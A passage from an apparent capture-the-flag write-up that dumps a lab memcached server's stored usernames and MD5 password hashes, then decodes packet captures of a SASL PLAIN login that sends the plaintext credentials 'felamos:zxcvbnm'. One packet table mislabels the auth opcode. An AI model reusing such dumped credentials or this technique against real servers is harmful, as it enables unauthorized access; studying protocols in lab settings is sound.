"d58f901b7d157b0985fb4184ff038ecb", "lonzo_swaniawski": "0d2677cf56d2f1d67ebe70542147847c", "rosa_terry": "91b43d0ed210c90e763e4e853252b248", "nicholas": "4e058f03da0d304b582df459a9b661d7", "gustave_bergnaum": "cca7a2bc7e9162f6d15adf7baae9059c", "lea": "28853a2a70e1c86a1deea6dc43955465", "taryn": "364b984b0b4d3b4ce1299a7dd7c9d4df", "theresa": "526b1c521bd5ecf46e9669442e816b77", "jameson_walker": "1817a9122d40c289406a4e7af1476b53", "pedro": "08bf1ccfa7dcbbdfdf79dbcb7bb7a468", "brenden_kilback": "0b802bf4e6a5ddddc39e26cd7d040cff", "tatum": "129ff9fc52d1cac1f029ca84c70855a6", "micheal.roob": "b4226007a8562deacd956a2569f0cb2d", "loma": "c32232d767f107e4a3fe524cd6559cfe", "eric_stiedemann": "36da31d4b347b1915681c72176525788", "juwan_bode": "7e5362a44ee2225d1c8c76dc369cd58d", "janick": "861fb559a54e2e8313c0ff048bab12ee", "carleton": "07005280d93fd2e902f5a95ac1299ffc", "stephania": "3a067a8e25bed6c4ea019cee7ba1a1e0", "sage.hackett": "bca3be99b04852f685f077db0fd1d8d1", "rafael": "55ce565b02d7d4123abbc0b2a49dfef6", "erwin_lueilwitz": "fbaec700c8be8f14fb5b0d4af71fa9cf", "audreanne": "bfb1b0e9958ed23de531eb67adfa1525", "lauren_von": "05e8421c9a567fdbd0b8a2f714072ded", "letitia": "bed4b8ec7a00075625bcbf15b10122af", "kristina": "f48d6a888644cae5c9bf3823b0b863a2", "ada.okuneva": "140a782ead679e5639394e37ac4a58ed", "marjorie.cronin": "dcf3b5bc90533b12cf0cb766a640d4dc", "sarai": "f3d6b3cdec7aa6d5b15e9e0f961e2536", "vivienne_bosco": "d36dadb2a0ad3fbdee05c5319de373c3", "angela": "19301287e76e010104ae6af3d37d3b2f", "alan.haley": "599da20821b9303a20555a0283c8f034", "zora": "28f9449128392e976596c5ccbd24c210", "concepcion": "d9c653ab729b3701b1f64339ec5af1c3", "vilma.bode": "c7b70b166c109fb69bb040f685c8ae91", "cleta.upton": "a8654d8b2b83beff64e980e0b2b8b202", "fredrick.corkery": "d0d8dbb4a87c88026eccd40eec4478e8", "odell": "26caa591b742a74972a01622da3ede07", "casey": "8da7a661eace0174d59556e84fa5d90a", "albina": "3b831bb107e13aa2ceb286c3f65f8de2", "fredy": "51d1a18978e6d23e5815c40449ea328e", "kaelyn_donnelly": "45538fe76a4e915eac3f1474d78623aa", "norwood": "b821d7b849fc2a2e38f48c950be39595", "makenzie": "3f53eccd2da96bd6d4be730155be5c31", "jude": "5d4c8252181717fa0534302e788fb8a1", "irwin.nikolaus": "b0497693f0550031577983ff86685c33", "phoebe": "20a9c8f682f25faa8bff3086df5f88ce", "henry": "9772d9d69bd464bebd8d06c47cdaf3df", "ward_hoeger": "0c81ccc4edcf89fbf178a3e0044c4a90", "vergie": "f97c39f137954b4b0e2d8480bdda214b", "lavina": "5f92bb19f3767c17ef2b97f7b505ef45", "wava_yost": "3744e8a7c7df2fa29151ae49a2f2fee4", "lessie": "67a271ab3f3e7f09ccd802cc8808719c", "cornelius_pouros": "716a01e62e7cda281327430037d1ef73", "maynard.orn": "6d0510edc7a69932ba16e0bd1c100ab3", "winston": "bc362c77db53bb7dcc07907145eb6fd3", "jamey_hand": "2ae805a49588a4480961b0af03f2c2cf", "isabel_kessler": "35d01751b71b11a40e8563fb4f8e11c1", "eladio.crona": "ecdaa5d65506ca50e2e7a80590685f89", "bianka_doyle": "fa1444c5b86a39192bb182514cf5d0e8", "zachery_rath": "249ca4183c508d570de88d609f8a8097", "luisa_d'amore": "8c33be90fb59ab662c871ff8dd296992", "manuela": "fa5b845356350c39f186923f6cf42803", "alyson": "c3b0f90583507db818f7e38a38bbc687", "zora_heaney": "fd8b67aee0ec3f73e99acd298e208db1", "amiya": "43e7e28bc66becc40e5aaecfea321fed", "sid": "5bf3b8568bc55502de560338eab20735", "emmy.mclaughlin": "8ef2916009a3bf02bfafa56b10a3a986", "violette_oberbrunner": "39b8d23b7ffa778997f2c714a7e2fdbe", "alejandra.fadel": "df17584138c181f3877eaf42ec8242c6", "flossie": "979ad865697faa0e3a5c72aedce3277c", "kian": "f7ca4b3525e3738c65dfed1d90f594b3", "ova": "bad948666666f6fd361d4b89dc08cb15", "amparo": "5420d59cd494938fc26ea15d481ba462", "shaniya_moen": "0ecf8418ea8aedb03b9441cc8b711cbc", "aglae": "0ef9c986fad340989647f0001e3555d4", "reed_hilll": "67a093396712d4c5536dd2bb3f528ec9", "amaya": "56971bd03c581cbc786bb48604f845a1", "cecil_auer": "5f3b64169e09722ec64eb63475977b8e", "estevan": "42be4d1394683c13de82e76156b8a1e1", "glennie.heathcote": "9dcc2fa59cb13dfffc86a8c49190dd3f", "elizabeth_sipes": "f73ca0a7e8521d816bfc361a9f7823ba", "oral.casper": "3f9608f459ced161e3b8ce37338b9abd", "logan": "3ecd08415bc676a07d11a85c9122ce53", "london": "97c8ae00825b4c90d7bdb7af382e41a7", "brisa.mitchell": "e38d2480789b6e05de03590e9c9208ac", "ila.bins": "2fc284dce7d8ff290849b509865e5e2e", "kaden.kassulke": "48234a756584dd31a8ce01dad87b99da", "dovie": "7552336d6495bd7f8a6cdc6e7458b4fd", "charlene": "318d1eaebb045f6088e2c8c4b9c35ae6", "leanne": "b384c5c9d21fa41684a32dfff0ea6252", "nannie": "de7eb503516f852e3482f2587b2366f4", "bridget": "9107babf1e6506f49b3cd715312d76bb", "isai_towne": "1df395aba4c3ca7dfae2f143d0a70485", "serena_carter": "0481206d68e5a601d24e4b6da9985f82", "beth.larkin": "2b72ffa129a4f621d6bf699edee343aa", "fay_berge": "15a417c11560db7069da517c8c80d29f", "kacey": "761f7b56aa37d945f882fa646fe8adb3", "hugh.denesik": "6cb0759f9372d1042dc0d6591ca6cb18", "brionna": "3015e498988c8ec5a8d369646571f065", "richie_orn": "83a276d036f01846d6eaa45e70bf8d24", "freeman": "b8332939d755374ed991272ab4f2c8e3", "larry_cassin": "de326ab7d2aa05ba1af6943b3c8f333d", "robert.emmerich": "4e09acb25d1776706649349ace763c13", "ofelia.russel": "b56d123797b239a0ee4d4ac778cf3ce8", "hannah.feest": "8f3c7fcd4a341b2018d880eeb2a11c9e", "vito_gulgowski": "cefffcc8e547beaba146904a93255204", "jean_rempel": "b7c1ef59d3b4aad87ef994e141f5ae7f", "odie": "2de7aa917825912e89b3c83c480cf434", "louie_hessel": "4b4114c18cc54ff8c31f5b5787449a39", "kristoffer_collins": "85ebbe57aa82d10b8b7ba09f773c1be2", "brad_frami": "59cf8a54637b8341ecc97ad5dbbbc60a", "hollis": "f5d091bd134e71e277e1c34674054456", "henderson_cartwright": "2f255eead56a37bbb033e3df06f0d20f", "alaina": "d2709b80ba1068bee597c9277ebcc45f", "eugenia": "41c6c7da4d87771bbd345c5b8dbd1827", "quincy.conn": "ce1cf1cac8f65e91a0ce5f0d6978a5e6", "alec": "1e0ad2ec7e8c3cc595a9ec2e3762b117", "eula": "1a5a5a3722c63d6eb3d3373e4e8e74e6", "stewart.feeney": "86ab1cf9321491b52f7f9d4cc10142e0", "thelma": "9eccc669f6a9c07acb9a2c2411fdb013", "rocio.rippin": "d0f247681b5a727d857d13530d51f985", "trystan": "0b25a2eebaa9ee930781555186de17c5", "kamille": "426cb99db6c39a0df37f9be3513c75b3", "kavon.lockman": "c26ef902a37aa8b9d6797a6f694be54c", "kitty.muller": "df2a1771fb514e6a78ef6d116594bc21", "elissa_berge": "a68ffcad956db0e0569564d6d81f4250", "eladio": "7d920b51c9a57aebfd6dc4347d4d7a2c", "rossie_block": "790509484283045203e376b49c954e10", "erin.mayer": "dccff4c64c0e7e2c6b0dca2d0c39f6aa", "monserrate.keebler": "8dbfe8f003f068b840a1dbf4ff919fbf", "phyllis_simonis": "ed44873afc41ab58f926e4284c02b561", "mandy": "942db2bacf41683fcc4e04e3c34335fc", "vincenzo_kemmer": "2b4aee4117e36a8c6a87b225609081db", "zander.wolff": "b3cce0d9c261c1604d405dd1db9e68a1", "melody": "d6a9296e27620dd434c8e32d652e9e9d", "lucy_kiehn": "033492d6c47ee1d36cffeaf4fa5f29a5", "blanca_price": "6e8d97a956a1dcfe22c1effd9600172f", "chloe.beatty": "4d22f1b4479808453175a1028841661f", "victor.padberg": "f4c11ae170604db7e2d7a7ecbdf6ccbe", "cullen.russel": "ddcdb7b2025437e20356587af7c99c21", "justyn": "64fbf90851399501ce9291e67ef3403f", "johann.bode": "aa54bc05697ccd3aa8d426310670a352", "marina": "c3ef44d2c57c12b8958672bc30cb8f45", "kayli": "2888f5cf08564814210018408825e6bf", "princess": "d66e05b4d04628ea2f7359e401e81374", "ora": "f8e94bf5739536f113c53039cdb6249f", "reilly.predovic": "c659d93d4366021386deedda91236e21", "allen_hammes": "acd074eecbaea366fd14f0357fc6ff69", "davin": "ec31ee422a941d8f339de2ac45af4dde", "leonardo": "238168ebe8d270cddb54055b38247dc3", "florida": "95ee7e2f6578559546e4fe50ac106a25", "leila": "6bd6c6544d8c66c6f50f4394b56f449b", "maxie_wolf": "c945c5b44bbcab8f4de00fff1eba88f6", "mae": "9b270356e73e29758d1c7712d7e1d85f", "stewart": "0f34b41eab3b12d24e5e1c435b8b27e5", "justen": "118fa059150517f8e88661accacf2671", "kay.volkman": "dd49cf36c2e32df7f83152686941964c", "ona": "6f9ff93a26a118b460c878dc30e17130", "rowland.jakubowski": "b2c2f390789cba812459de6c583d7537", "reynold.howe": "3a241f5e425a801d3e95573bce8be19e", "pablo": "fdece85a1dfc076a910a893912f9e199", "lolita": "37d231f897d51ffd072ae9df5eff6aeb", "julien": "10f4c5279654486006b4cfc8bf1de453", "gertrude": "5a1abc5462808e9d26dd325d944f8e18", "dedrick": "9f4133027e1edcff4c9dbfdd5e04efb2", "kailee": "309a82979b770924cd51a6be1a4baf16", "alfreda_satterfield": "e63d53b2d60f78665b65f650875008fa", "shanny": "1d1e09fde01e9476efd8c0cbfe550973", "maximillia.stanton": "31bb9a0f9b543d975a0c219484a86c81", "naomie": "3dde2f72cdb38204a0e6ad76c66de69c", "blanca.mertz": "adffc887aa9c3f92beeb227e17707430", "shyann_rogahn": "2d215b47f98e9f78cfad5709d83a9649", "urban": "1fba221d88456fc547dec85a4793160e", "michael_pagac": "c01fcc59754ed2b1ca19465ea6f184a3", "mariana": "44a572372a7d180d5e63ddbe280282f6", "wendell": "eb95fc1ab8251cf1f8f870e7e4dae54d", "hillary.renner": "f137ca4e2d286230d41853366f62f5aa", "camron_kunze": "ebdc6a8d1f59ea3ec626b266d7219b48", "milton": "78b380bd3810fa6e5e557a49931bd558", "ryleigh_dare": "89577f29d8335fa45aee8ebb1c1db72f", "clara_mclaughlin": "170badbf907bba1bc9d660a723981413", "lauretta.dare": "978ddffe140379680e43e68ac125b217", "velva": "497c29830d87b421562c7273b345abda", "herbert_wolff": "7c1f552c7ebb903fc5399a11e1db7561", "craig": "491d459e5dc4b378498d780be2533119", "jaida": "fdf25e7d46357c2d920152408d2d45fa", "elyse_white": "efaadcc2457a99642c0084c6680731a2", "clarabelle.considine": "375cb9144a5536690237ddfa4c3b4772", "elise": "a1871cb1a9d2df85d01ab1caf4f3a128", "paris_schmeler": "ab6cb24b7f76a6029a4161cc110974a3", "tressie.corwin": "1d52695de822166ed2e1e98b69a516fb", "lia": "2c01e08daceace4ae887a8bcb45c8dd2", "dallas": "e624e789fed45162312d24f3df5f9b9b", "coty.leannon": "444da436fea5ee604bab06c74128b385", "arnaldo.murazik": "d585c20724405b19d2929b2fa13c5659", "bobbie": "8f0d76c35e47306d0a8a15eb1280d5f5", "janiya": "338c0ac5d93e673e9b276b6b3d07b158", "megane": "4a081e66b94b652a69055c0e358ec613", "gretchen.weissnat": "f9d939c1859bd97c58c8da58fc2e49b9", "friedrich.fisher": "20327b5ced744ab62377cdc545352756", "santiago": "c1d5ae95f059832af7450a139b33e9de", "trace": "432ed5f38900291bedf745852d9262ee", "price": "abea2606dc153afbcb47183068c7ec15", "jaylan_sanford": "96bd0e2a65e755af22c5a803bb1d2c79", "rylee.schuppe": "3cd59cd615fc807d7ef87ec2a5267a38", "phyllis": "bd20c64d01d096f8549232d44439abb4", "pinkie_abshire": "dba20ec8e1763ff9d4dddffb1a3ff961", "wilfredo": "037b4fa2b48db8267f73c6e0e1231576", "roberta_collins": "7cb47ceed22341c820f1526495b2ddef", "hanna": "879408400ee777697ffb19c6418c2068", "wyatt.pfeffer": "f25e618fabe1a76258019d690e9f9377", "erich_mertz": "b5e72bddda06d750f37fbb6f8606fe0d", "jarrell_gorczany": "f6c21d7f525ded5de3670e70db8f7124", "kelsie": "8d297f740b0fa8427a30b4657743387d", "lyla": "21b720ab14b8c538a35efa07af4d4366", "ed.wintheiser": "59dc08f2af53ce7427d9d9a5a2270e92", "rashad": "9dc57e5f42a313510cb1aa808ffda1c2", "thomas": "139563da1ef16ad511ac15199f1e432c", "einar": "b7bc4ae911a48e8e8a01704b02ca143d", "margarita_cummings": "6c87acbf9020381c93d6a896ea24bee2", "kayley": "d2efe33258db4b2384cf35227b096856", "finn": "a52b5c9241362d50663494282bffbc85", "maribel_gutkowski": "604f950b023d40e015a3808f9f77fa67", "raymond.dooley": "debf9e221aec842c96573f2b38525af4", "eve_koss": "69744c04604496df7e28a751e74f7850", "kayla_huel": "a9c1f7e2bbb6d19ca08acc56fc098f1e", "roma.reynolds": "ba0957e50bc7d04ea154da4a0da8931d", "sierra": "5d70d8e5414987d75d12fc909e9704bf", "adolphus": "c04edf1891481c950b432129c98ae579", "alda": "882c80e0fd479bd4ff538f156fba3007", "celestino_smith": "8d4c417b64ad4ad68765620f701247f6", "loyce": "c877cc765ceca0d59fb904be5a44d749", "hoyt": "1702b74835052498b402420b3c42ea30", "hilda_o'connell": "d1ad483a1ecc574c50de8290c769b497", "twila": "e5d7761a26646db3b9dcf523d53fbc45", "marcus_abbott": "bf9e1d4004b24775d2886a03174871fa", "everette.brakus": "a4150e0f035ef0bfc6ec3e2aa5c54dd7", "jazmyne.nader": "340cee69be65e03800dbce4be148b7a3", "foster.davis": "4953daecc037486e2d0aafc0cbfc5edd", "dante": "d67ddde9004daea336376d51b2bdeb41", "aron": "102647061f946392944b8ad4a9da8e2f", "lora_skiles": "0b42ca911325410e734c6269ca800014", "doris_ritchie": "f520ca8d3c45df2ce8083daedc8d6164", "jalyn": "888b79bce75a12dd9f59b19abd975f8e", "issac_glover": "4cae6414e2e8e0dcff0e3757f74a3e7d", "esmeralda": "fb0b7274ee215172d13f0c7d5ea43407", "mandy_emmerich": "2f7af55c3d7d8fbb2248b0a84ba1d153", "liam.boehm": "66eb73de6fee1d06c74dff71db2fb423", "guillermo.fisher": "fbb789c02ded40c7f379df2f7864cced", "payton_feil": "c4629a6f0e9e2bd433e7b75de370a7d1", "jabari": "26cd05032b69d980d469049a45d4ff5f", "allie": "582f3f26054b3d582c5aac48e82fd732", "gregoria.bayer": "987e9d24bc4c2c7c9df882eaffc46dd1", "tabitha_paucek": "6ab9a62446efea28f67cad6743e2b858", "alexandria.roob": "2c5167c7a9ea4adef95ebcb1a78941aa", "ralph": "936f45609ddf114ee072b6913fdfcf5c", "winnifred.ruecker": "0af32299c1f10ebefa8d1c0e8c456bec", "deven.sanford": "ba0d68ca29c0909f1e8059641c0a239b", "rosie": "4e1fc346e7c4ab1a4117e672104c2868", "coralie_zieme": "54367234b56d1e840e7be52d08244697", "elbert_dooley": "d78c8062386ffd8cfc69c122eb61ca5f", "admin": "2ac9cb7dc02b3c0083eb70898e549b63", "keaton": "08cbb71c4a2724b9c8d0c5648b80acd6", "cleora.breitenberg": "181defb29bbf88668e8c92c4944342e2", "kirk.flatley": "2d93560dd57e4a7407639ce806b6f3e2", "immanuel_zieme": "89e90a214d3cdd0c7ce8cac78ae892ae", "dortha_schroeder": "eb6a24bc790c13f5f2d337d3341b6a53", "jackeline": "3f5f1d06ebf561d9c81395899515cd85", "magnus_stark": "d1cdc22920628286a631548ab045fbf4", "jerrell_huels": "ca9c98e7344ae860610fcf93a4aae1b6", "gwen": "b1d06d3ff76a39149901caecb75241b2", "lew": "2d62043137f31a3fd83d39f6ba64d0b0", "anahi": "e48819f584319fc7825818cb052bf6ca", "gerry.wehner": "f3d8cc2c0b7ff6273b0731f147236de0", "denis": "32a03378dbb3709c00fe1d91e2962918", "alvera.emmerich": "22e5af624d97a9958442d0ac75db1075", "tiana": "220607eb9bbf6b2a4f950fbb1e4ae059", "sammy": "a8a37c7f172c27043ca799694aeea5b0", "keyon": "a3154a1560f1e81af73b30944f4c5e32", "nicole": "23f848ba3deff4b595e1e4bc25dbaeb5", "ronny_koch": "c3aba5517f098239b4b9b201bd4aaa7f", "tatyana_dietrich": "e14fdc75604d2c3a779513ed2aa4ada9", "jeramy.jacobs": "ddd250fe435a67417e08681becea604a", "marcel_ratke": "41f789d9e284ddcf98a8ae41fc46574a", "porter.murazik": "c5aa1c9ed87d1640fad00c81d6b606b9", "dallin.marvin": "1d29e1907add5bdc157be32b85844b2a", "neoma.nader": "5727cac3cbb8f794a397b08887d7928b", "jerrell.dickinson": "b2ab997c50b8b46dfadc584eea737456", "destiney_o'reilly": "7686e6e57f4aab28b9c359ad0d86ec97", "amani": "1d1f548717379da48997e969a8a64d3a", "arjun.ernser": "504859dab10aefaafa0d0c7671e1b16c", "dannie.stroman": "14cee124780356003325d96308efbf44", "caterina": "41a0e81194b21f3f37223004c13849d9", "stuart_gutkowski": "af0cc9fdcc686b01d089549aa0605213", "maude_zemlak": "d7f1e37a869b117301dbeb9f086a3fef", "mireille_cruickshank": "f3923875bfc6f4aa9a0ff9a521ec936d", "isabelle": "c20670ad7cf7664ccede04858d108cdd", "sandrine_crist": "2fb83faa50fde4f34460e7a30696fd59", "alva": "c0431f9f4faf269c193120cdbd00a21a", "doris_donnelly": "03104c8c48333b42c8f83fcda8880e6f", "kaitlin": "eb85fe5e49ede1ef9569f163ff3f4470", "jean.lemke": "516916298f414abef25f683fa941110e", "abdiel": "2c910ddfc4e0132d1d81a1d620600467", "abner_stroman": "5935d0e1a496b73537777fcf406dc020", "macey": "bafed1c91004a16534b19d681f03d530", "devonte": "c1cd9d0cd159ecf73c3a0c404c144211", "iva": "0173414ea8139684f04d954ef3c8c1a9", "paolo_streich": "c5584a3f8a4127f8267cecbe5a472035", "demo": "fe01ce2a7fbac8fafaed7c982a04e229", "owen": "8df8c31baf45ef725c33801ada12b5ea", "audrey": "9a1ab2202abb2b8e9dc7e2783f75788d", "darrell": "ddeac952a6740e05f416de5874c1cd56", "mathilde.yundt": "c0aed5cc753584cb09a42f22bc4901af", "jeanie_balistreri": "3b5055ec0293d04caebd679b7979da29", "dejah_wilderman": "d2642f95ebe20b65169e0f927b2b0999", "bella": "4bafc76b4a11f6a1ce1ef988d995262a", "vladimir.rogahn": "b9c8ed82f30172bc20c97e2fd8e0cc8f", "samson": "029b7aa1acd10b796b196ee3d4097e0d", "tristian": "d24be8b2125f6d22d4c5ce43e1e3199d", "xavier_jacobson": "2b82a4c1aa7f9c44ed6e3bd1914ac490", "evie": "de12f8592ef5395a15b6fd2202197536", "dock.kiehn": "5a7e5ec678249f652a3bb81cad0c9f60", "vivien": "3454f4d3387a9bd8a08d862b457e486b", "gaston.mills": "a6cf224244f758d16713db0b3f0f21fc", "mafalda": "0a8403926f54f19f0e46f17b91a2c2ae", "arturo": "cae80c57461a1a295f04b4a49ee1293a", "tiara_schneider": "10a84f8c91255b419fa881d6f732faf5", "conor": "e010250e00ec9d5af6f77e40cda87897", "kristy": "575fa3862f7222b9b5385026ef32d688", "alfredo": "cd39f9ce29eb4c5bf7ed71a834e4d894", "rocio": "c54b17127ad539da05763e88d344cfbf", "kavon_jaskolski": "e5940103ff76021050b570d798e5239c", "sonya_abbott": "b7d25922e320182c85ea45686f56a775", "summer": "ba75add97ea218ceb7dda8e28bb24eab", "savannah": "e09006276783fa0feee15a4f51287855", "jaquan.sauer": "6f04804d79697dbae3657b5934f26074", "jayce.hintz": "99b487460c327c8d5c7ca663219e8b74", "margarita_okuneva": "00d06142ce0b5a7243ad2909b5848c59", "cary.ondricka": "bfbf852d0872233ba848917ae607575f", "lexus": "083e0bd1e7149ee3f759fbf6ae3485f1", "logan.white": "a58a994f2ba6a7ffb61f5cb0b89d8523", "nick": "1a05c0b6f48562aec32810bc35073661", "rose": "61651b6760fb585a3641bc41da8e855c", "pat_wilkinson": "e57588e053a34e57c691033732082f58", "genevieve": "fc7992e8952a8ff5000cb7856d8586d2", "blaise.sauer": "86cab94e4c136f058cc9710e5463268b", "abbigail": "9731e89f01c1fb943cf0baa6772d2875", "sonia": "16e536ac3d8b71a8458bca4b4a5c02ea", "maya": "bcd23bf4b88d707dc8b9779d7be17189", "monique": "8b005ce5899bb266c949c49dd4662ec6", "eugene_kreiger": "3955cb5285fef4dd8f248ca3b97e933b", "ahmed_gibson": "8915af36bc729f449664fd5a0c720c75", "clair.cronin": "93ccb8768bf9aacdec74de999e01a5bf", "sarina.hodkiewicz": "ee1439dfb65cc43814d8dc59fa90a339", "lavonne.schroeder": "fe1a46f519e9af9fa10b9d12f88b96d7", "dewayne.steuber": "ffc56ad16ada1bba47a8104956d67d71", "fernando": "1f1bcc2c1b44b07e2364f3741a47762e", "marques": "8e6f8704b029cae0e26636be1bce50ef", "brianne_heathcote": "4b6f19924e076f588844e91aa4caa089", "rachael": "32fc152051586ba48c5eb53d1f9bc11a", "alexandra": "ce7f915c0b543ed8d4b77a47dd24737c", "clementina": "0f5198cbc4b9a98548dbf946eb8c2168", "kathryne_kling": "9009e43a2805a6f1d45d3d9c59b3c130", "alexandre": "2d4b230e2240053c4d9ebb9613856908", "ivah": "2b0535023a614acafb7b7f5fbb91eb3b", "xander_schoen": "efbbd15b30cbfe2a206ca1291deca009", "shea": "d2736f6b7b47a40b1615af3ae419f6ab", "donny": "94e406b569e15565746d0a9592636f56", "jimmie": "4950c4c8e41c25a0c4cc913ff3f96ef1", "kathlyn": "34b8bce72871d15ced725cc1184f8f4a", "cleve_mckenzie": "4ae1a59c3cbaa065adbf26b904fa6781", "ashtyn.will": "d249b651702c68a2ed1fcfe2b4d99987", "presley.weissnat": "7b5168687749996ab74316a885e2b881", "marjolaine": "947c16a51f8e590debf7c9105d64c7df", "vivian": "ef0ca75e2d27434d2c4e02ac2c0f0c6e", "jennings": "41121d6da3615554ad0e0d01172634ba", "merritt_marks": "08ab1f602ea471e4e1a04f3934ec73e9", "efrain.hoppe": "31446ccc8161d50e2cecc133e0b11f85", "carol": "1f7374359d1456c11497aeaea408f84a", "genoveva_carter": "8838d8fd3db319f7a6a67d0ab5e52021", "jevon": "9e876fe23bd371b5bf7c07ca3f6d7634", "julia_monahan": "4c7fc2df5576ee3b68c5c79a755a0d33", "stanton_reynolds": "eed7a216ee2b9026591a29354acd3193", "tyrel": "150937304c73b4088c35c574d2f41f03", "carolyn": "4e2de8249eaeb94175a3e4824ff66c7c", "willow_mayer": "c65ea95f54056088f616601766eaa2db", "elenora_hahn": "919cff95c01cf51e2fd9a74db418c4bf", "jacinto.yundt": "ff5c237762ac41b30e59bc7b21042ba7", "aliyah": "20b4192f696213a8f4c7e5c7f84d60d1", "wade": "90346439328d6a4dd28af2b68acd5048", "leonel.marquardt": "ed98c3ce8aea0881334fe76de885dfc4", "marie": "7905c8fa4ede73a339906006b0e9c7c9", "jany": "a0a84994d69b3e738c1ac376df1dcabf", "vicky.hansen": "3e92536b0a568ede949bf1589bd16318", "arielle.sauer": "4bbe939fc8ac2d9bffc36aed5dacb9b1", "angelina.murazik": "aea180b10da81b62ffb6f35c033d99b1", "marcelo_brown": "f016e357657692aa181ca3cdfaf7b811", "eulah": "d772f9b38c9aa2d457c034d838c1be21", "jerrell": "1fe4031155a1412eb41f806740209cb0", "robyn_koepp": "edb235d64e26dfe7eecf820aeec20d09", "johnathon": "1cc714db88bbf5cd11ce6de641bf9e8d", "jacquelyn": "8189067a15ac1a5f5d57b6520b3c5c98", "nickolas.muller": "6bdde7ca2ab71fbb063c4d94ba7a0cb0", "lilliana_cummings": "c9c4cc2813f63b6da914965e41ba3476", "rachelle": "8d783621dfdb8722a80b5b10a45632ee", "lauretta": "eb462e1df69951cfb55d2cee556a49cb", "cordie.ortiz": "e12fa6b635222f258e1b0729755f3746", "rick": "0daa6275280be3cf03f9f9c62f9d26d1", "karl_hane": "1707c74ab5a1f96b9561a5b905b4f0f0", "gail": "5ae72fc8f3cb837ea4199362d70d7ae7", "adelia.berge": "bab4822dc29350a71e1015c916782713", "bud": "a994cdb47a8f661d7c091f84d4bd17ce", "rahul": "4b6d890ff0ba849d2724ace69db763c3", "stanford": "29de69a508e1f96a87898f50a564b9a6", "default": "c21f969b5f03d33d43e04f8f136e7682", "emie": "f519fdd188bb126dc912227a8163745c", "anna.bins": "10a6fffd7be7a218b2bd3507dc175dc5", "dane_wyman": "0ba31824ccdb1e133f79ad04f3855e40", "arne": "a791bbdf84fd98116c04246573d98e4a", "nat.wilkinson": "dcefd200f4856aeda1fc721a544fa717", "gerda": "377fc2d8b7c81f91708352491bc5d1e9", "roselyn_streich": "e32eebf5d2da2d61f08e5e4dfff04029", "d_murphy": "254e5f2c3beb1a3d03f17253c15c07f3", "jacynthe.kiehn": "bc8bb4c0f4ce272086b2cf02f6123f1d", "kianna_block": "bceee353497d21dad6b745d668d1ba3c", "manley": "be362c649da16df9d5a9fa854ddd3a24", "chaz": "648a629ea7ac036a9837e72da9f1fac5", "joanie_zboncak": "0297dc52c8540050dad5fc82aaa3026b", "adolph.kohler": "65b6d8708f1e865ca9378fec74407ce6", "dejon": "389bfdf3859555f26c28827583237c57", "dorcas": "2a9bed3bb2052c644a7f3130ddc78546", "benjamin.pfannerstill": "67b3ded77ab0a3f4eefd37a2ded00f48", "onie_kreiger": "0406b1f270012cdafac8fab92fb0ccd5", "jaquelin.medhurst": "63d75125cf5db3fe850cf359e0237992", "heidi_krajcik": "adf27575ef70c773fed3cd82fa06fa1f", "clement_cummerata": "4d71cd239acb3f9a5198159beaa05575", "tess": "389e03628382fb010c729319953e4c78", "lance": "b713cf03505e7e3b995f45f6df5e9460", "ursula.weimann": "e12e607e7bdd2105cc3d68c33c0d905e", "maximus_robel": "c3655a791fa65e0a75c849c1d56d66a1", "irma": "5177790ad6df0ea98db41b37b602367c", "lucie": "01971ddb0d362010a8e484f0630de1e9", "devon": "953155467fab407a18cb7c8f576d1ef6", "kory": "c40c83a8bd2914202bd22770405b0b4c", "keely.reynolds": "8b0b59e115aad4d3deee62b591c80b28", "adrianna": "3ceb64d1364a8c92134484029e4f2770", "jaylin.langworth": "f3e06518bbfa9d108ad30cf5628e480a", "agustin.kreiger": "a434c202f65475988efa9622a77f9594", "shaylee_roob": "81dbedf631f0dd59d00403c661972c0a", "zelma": "55f0db8276de5dc76d9b858bd0de78a0"}
END

```

The packet capture shows just that:

![image-20200603153946328](https://0xdfimages.gitlab.io/img/image-20200603153946328.png)

### With Auth

With the baseline of understanding the standard case, I now wanted to see what authentication looked like.

```

root@kali# memcached-cli felamos:zxcvbnm@10.10.10.190:11211
10.10.10.190:11211>

```

The resulting TCP stream had three exchanges:

![image-20200528130951385](https://0xdfimages.gitlab.io/img/image-20200528130951385.png)

The first request offers a new Opcode, 0x20, and the rest of the packet is 00s:

```

   Field        (offset) (value)
   Magic        (0)    : 0x80
   Opcode       (1)    : 0x20 (SASL list mechs)
   Key length   (2,3)  : 0x0000
   Extra length (4)    : 0x00
   Data type    (5)    : 0x00
   VBucket      (6,7)  : 0x0000
   Total body   (8-11) : 0x00000000
   Opaque       (12-15): 0x00000000
   CAS          (16-23): 0x0000000000000000
   Extras              : None
   Key                 : None
   Value               : None

```

The response offers the same Opcode, and the value “PLAIN”:

```

   Field        (offset) (value)
   Magic        (0)    : 0x81
   Opcode       (1)    : 0x20 (SASL list mechs)
   Key length   (2,3)  : 0x0000
   Extra length (4)    : 0x00
   Data type    (5)    : 0x00
   Status       (6,7)  : 0x0000
   Total body   (8-11) : 0x00000005
   Opaque       (12-15): 0x00000000
   CAS          (16-23): 0x0000000000000000
   Extras              : None
   Key                 : None
   Value        (24-36): The textual string "PLAIN"

```

The second request sends with Opcode 0x21, which is Sasl Auth:

```

   Field        (offset) (value)
   Magic        (0)    : 0x80
   Opcode       (1)    : 0x20 (SASL Auth)
   Key length   (2,3)  : 0x0005
   Extra length (4)    : 0x00
   Data type    (5)    : 0x00
   VBucket      (6,7)  : 0x0000
   Total body   (8-11) : 0x00000015
   Opaque       (12-15): 0x00000000
   CAS          (16-23): 0x0000000000000000
   Extras              : None
   Key          (24-29): The textual string: "PLAIN\x00"
   Value        (30-44): The textual string: "felamos\x00zxcvbnm"

```

The response shows success:

```

   Field        (offset) (value)
   Magic        (0)    : 0x81
   Opcode       (1)    : 0x21
   Key length   (2,3)  : 0x0000
   Extra length (4)    : 0x00
   Data type    (5)    : 0x00
   Status       (6,7)  : 0x0000
   Total body   (8-11) : 0x0000000d
   Opaque       (12-15): 0x00000000
   CAS          (16-23): 0x0000000000000000
   Extras              : None
   Key                 : None
   Value        (24-36): Authenticated

```

The response and request that follow are a `get 0` just like on connecting to Dab above.